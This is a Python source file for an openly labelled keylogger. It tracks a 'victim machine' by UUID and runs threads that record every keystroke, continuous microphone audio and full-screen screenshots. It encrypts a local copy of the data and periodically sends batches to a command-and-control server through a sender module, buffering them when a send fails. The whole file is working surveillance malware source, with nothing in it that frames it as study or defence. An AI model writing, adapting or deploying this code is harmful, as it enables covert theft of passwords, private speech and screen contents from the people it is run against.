# Core modules for unique ID, serialization, time, and threading
import uuid
import json
import time
import threading
import base64
from pathlib import Path
from io import BytesIO

# Audio capture libraries
import pyaudio # Requires separate installation: pip install PyAudio
import wave # Standard Python module for WAV file format

# Screen capture libraries
import mss # Requires separate installation: pip install mss
from PIL import Image # Requires separate installation: pip install Pillow

# Keyboard listener and encryption libraries
from pynput import keyboard # Requires separate installation: pip install pynput
from cryptography.fernet import Fernet # Requires separate installation: pip install cryptography

# Custom modules for data exfiltration and configuration
from sender import send_events
from config import (
    SEND_INTERVAL,  # Interval (s) between event batches being sent to C2
    AUDIO_RECORD_SECONDS, # Duration (s) for each audio clip
    AUDIO_RATE, # Sampling rate (Hz) for audio
    SCREENSHOT_INTERVAL, # Interval (s) between screen captures
)
# -------------------------------------------------------------

# Generate a unique identifier for the victim machine
victim_id = str(uuid.uuid4())

# Define paths for local log files
encrypted_file = Path("logs/encrypted_log.jsonl")
buffer_file = Path("logs/buffer.jsonl")

# Ensure the logs directory exists and files are created
encrypted_file.parent.mkdir(exist_ok=True)
encrypted_file.touch(exist_ok=True)
buffer_file.touch(exist_ok=True)

# Initialize Fernet encryption
key = Fernet.generate_key()
cipher = Fernet(key)

# Global list to store collected events (keyboard, audio, screenshot) before sending
events = []

# ----------------- AUDIO CONFIGURATION (Loaded from config.py) -----------------
# Define audio recording parameters
CHUNK = 1024 # Frames per buffer
FORMAT = pyaudio.paInt16 # 16-bit encoding
CHANNELS = 1 # Mono
RATE = AUDIO_RATE # Sampling rate (Hz)
RECORD_SECONDS = AUDIO_RECORD_SECONDS # Duration of each audio clip
# -------------------------------------------------------------------------------

def encrypt_event(event):
    """Encrypts a JSON event dictionary using Fernet."""
    return cipher.encrypt(json.dumps(event).encode()).decode()

def save_local_encrypted(event):
    """Saves an encrypted event to the local log file."""
    # This acts as a persistent local log for all captured data
    with open(encrypted_file, "a") as f:
        f.write(encrypt_event(event) + "\n")

def save_buffer(events_to_save):
    """Saves a list of events to the buffer file if C2 sending fails."""
    with open(buffer_file, "a") as f:
        for e in events_to_save:
            f.write(json.dumps(e) + "\n")

def read_buffer():
    """Reads and clears the buffer file, returning buffered events."""
    if buffer_file.stat().st_size == 0:
        return []
    with open(buffer_file, "r") as f:
        lines = f.readlines()
    buffer_file.write_text("") # Clear the buffer after reading (critical for resilience)
    return [json.loads(l) for l in lines]

# ----------------- KEYBOARD CAPTURE -----------------
def on_press(key):
    """Handles key press events."""
    ts = time.time()
    try:
        # Get the character if available
        k = key.char
    except AttributeError:
        # For special keys (Enter, Shift, etc.), get the string representation
        k = str(key)

    event = {"timestamp": ts, "type": "keyboard", "key": k}
    events.append(event)
    save_local_encrypted(event)

def on_release(key):
    """Handles key release events."""
    # Stops the keyboard listener if the ESC key is pressed
    if key == keyboard.Key.esc:
        print("Manual stop triggered")
        return False

# ----------------- AUDIO CAPTURE -----------------
def audio_capture_routine():
    """Routine for continuous audio capture."""
    global RATE, RECORD_SECONDS
    
    try:
        p = pyaudio.PyAudio()

        # Open audio stream
        stream = p.open(format=FORMAT,
                            channels=CHANNELS,
                            rate=RATE,
                            input=True,
                            frames_per_buffer=CHUNK)

        print("[Audio] Starting audio capture...")

        while True:
            frames = []
            # Record audio for the configured duration (RECORD_SECONDS)
            for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                data = stream.read(CHUNK, exception_on_overflow=False) # Suppress overflow error
                frames.append(data)

            # Convert raw audio frames to a single bytes object
            audio_data = b''.join(frames)
            
            # Encode raw data to base64 for safe transmission in JSON
            encoded_audio = base64.b64encode(audio_data).decode('utf-8')
            
            ts = time.time()
            audio_event = {
                "timestamp": ts,
                "type": "audio",
                "duration": RECORD_SECONDS,
                "rate": RATE,
                "channels": CHANNELS,
                "format": "pcm16_base64", # Indicates 16-bit PCM data, base64 encoded
                "data": encoded_audio
            }
            
            # Add to global events list and save locally
            events.append(audio_event)
            save_local_encrypted(audio_event)
            print(f"[Audio] Audio event of {RECORD_SECONDS}s captured and encrypted.")

    except ImportError:
        print("[ERROR] PyAudio is not installed. Audio capture is disabled.")
    except Exception as e:
        print(f"[ERROR] Error during audio capture: {e}")
    finally:
        # Clean shutdown of audio resources
        if 'stream' in locals() and stream.is_active():
            stream.stop_stream()
            stream.close()
        if 'p' in locals():
            p.terminate()

# ----------------- SCREENSHOT CAPTURE -----------------
def screenshot_capture_routine():
    """Routine for continuous screenshot capture."""

    global SCREENSHOT_INTERVAL

    print("[Screenshot] Starting screenshot capture...")
    
    try:
        with mss.mss() as sct:
            while True:
                # Capture the primary monitor (index 0)
                monitor = sct.monitors[0]
                sct_img = sct.grab(monitor)
                
                # Use BytesIO to handle the image in memory
                img_buffer = BytesIO()
                
                # Convert raw mss image data to PIL Image object, then save as PNG to buffer
                img = Image.frombytes("RGB", sct_img.size, sct_img.rgb, "raw", "BGR")
                img.save(img_buffer, format="PNG")
                
                # Encode binary image data to base64 for JSON transmission
                encoded_image = base64.b64encode(img_buffer.getvalue()).decode('utf-8')
                
                ts = time.time()
                screenshot_event = {
                    "timestamp": ts,
                    "type": "screenshot",
                    "format": "png_base64",
                    # WARNING: This data is often very large!
                    "data": encoded_image
                }
                
                # Add to global events list and save locally
                global events
                events.append(screenshot_event)
                save_local_encrypted(screenshot_event)
                print(f"[Screenshot] Screenshot captured and encrypted. Size: {len(encoded_image) // 1024} KB")

                # Wait for the configured interval before the next capture
                time.sleep(SCREENSHOT_INTERVAL)
                
    except ImportError:
        print("[ERROR] mss or Pillow are not installed. Screenshot capture is disabled.")
    except Exception as e:
        print(f"[ERROR] Error during screenshot capture: {e}")


# ----------------- SEND ROUTINE -----------------
def send_routine():
    """Routine for periodically sending events to the C2 server."""

    global SEND_INTERVAL
    
    while True:
        # Wait for the configured interval (from config.py)
        time.sleep(SEND_INTERVAL)

        global events
        # Check if there are new events or if the buffer contains unsent events
        if not events and buffer_file.stat().st_size == 0:
            continue

        # Combine buffered events (if any) with new events
        buffered = read_buffer()
        to_send = buffered + events
        events.clear()

        print(f"[Sender] Sending {len(to_send)} events...")
        # Send data to the C2 server via the external 'sender' module
        success = send_events(victim_id, to_send)
        
        if not success:
            print("[Sender] Fail to send, backup inside buffer.")
            save_buffer(to_send)
        else:
            print("[Sender] Sending successful.")


# ----------------- MAIN EXECUTION -----------------
if __name__ == "__main__":
    print(f"Keylogger active (UUID={victim_id})")

    # 1. Start the sender thread (Daemon ensures it stops when the main thread stops)
    t_sender = threading.Thread(target=send_routine, daemon=True)
    t_sender.start()
    
    # 2. Start the audio capture thread
    t_audio = threading.Thread(target=audio_capture_routine, daemon=True)
    t_audio.start()

    # 3. Start the screenshot capture thread
    t_screenshot = threading.Thread(target=screenshot_capture_routine, daemon=True)
    t_screenshot.start()

    # 4. Start the keyboard listener (This is the main blocking thread)
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    
    # Block the main thread until the listener is stopped (e.g., by pressing ESC)
    listener.join()
    
    # Once listener stops, the daemon threads will terminate automatically
    print("End of the program.")